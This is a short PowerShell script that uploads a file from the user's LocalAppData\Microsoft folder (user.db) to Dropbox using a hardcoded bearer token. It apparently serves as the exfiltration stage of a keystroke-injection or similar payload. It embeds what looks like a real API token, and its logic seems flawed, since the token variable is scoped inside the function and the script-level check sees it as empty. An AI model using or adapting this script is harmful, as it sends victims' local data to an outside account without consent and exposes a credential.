function DropBox-Upload {

[CmdletBinding()]
param (
	
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[Alias("f")]
[string]$SourceFilePath
) 

$db = "sl.Bbu_sEznesS6JQ7swX2yyz4U9KR8vuyD8H8FBVHTN1ykh4qU9IGCT8XpoAXiJWYx_AaDq8uxkhMfhzGCnpLofnBDJM4SL-c9acaJvV7XQaSveSqOUplDiJIVANLyt4x3eY-CPkiwaM0"

$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $db
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')

try {
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
    return $true
}
catch {
    return $false
}
}

$FileName = [Environment]::GetFolderPath('LocalApplicationData') + "\Microsoft\user.db"
$result = $false
if (-not ([string]::IsNullOrEmpty($db))){
    $result = DropBox-Upload -f $FileName
}

if ($result) {
    Write-Host "File uploaded successfully."
} else {
    Write-Host "File upload failed."
}
